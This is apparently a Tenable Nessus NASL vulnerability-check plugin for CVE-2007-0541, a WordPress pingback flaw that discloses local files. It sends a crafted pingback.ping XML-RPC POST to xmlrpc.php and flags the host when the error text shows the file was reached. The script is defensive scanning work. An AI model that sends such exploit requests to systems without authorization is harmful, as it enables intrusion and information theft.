#
# Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24237);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/11/02 20:50:26 $");

  script_cve_id("CVE-2007-0541");
  script_bugtraq_id(22220);
  script_osvdb_id(33007);

  script_name(english:"WordPress Pingback File Information Disclosure");
  script_summary(english:"Attempts to access a local file via WordPress' Pingback.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host fails to
sanitize the 'sourceURI' before passing it to the 'wp_remote_fopen()'
function when processing pingbacks. An unauthenticated, remote
attacker can leverage this issue to determine the existence of local
files and possibly to view portions of those files, subject to the
permissions of the web server user id.

In addition, this version is also reportedly affected by a denial of
service attack because it allows an anonymous attacker to cause the
server to fetch arbitrary URLs without limits.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/458003/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2007/Jan/561");
  script_set_attribute(attribute:"solution", value:"Upgrade to WordPress version 2.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/01/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/01/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/01/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

url = dir + "/xmlrpc.php";

# Make sure the script exists.
w = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
res = w[2];

# If it does...
if ("XML-RPC server accepts POST requests only" >< res)
{
  # See if we can access a local file.
  postdata =
    '<?xml version="1.0"?>' + '\r\n' +
    '<methodCall>\r\n' +
    '  <methodName>pingback.ping</methodName>\r\n' +
    '    <params>\r\n' +
    '      <param>\r\n' +
    '        <value><string>index.php</string></value>\r\n' +
    '      </param>\r\n' +
    '      <param>\r\n' +
    '        <value><string>http://' + get_host_name() + dir + '/#p</string></value>\r\n' +
    '      </param>\r\n' +
    '    </params>\r\n' +
    '  </methodCall>\r\n';

  w = http_send_recv3(
    method : "POST",
    port   : port,
    item   : url,
    data   : postdata,
    content_type : "text/xml",
    exit_on_fail : TRUE
  );
  res = w[2];

  # There's a problem if we could access the local file.
  #
  # nb: 2.1 reports "The source URL does not exist." and a fault code of 16.
  if ("We cannot find a title on that page." >< res)
  {
    security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
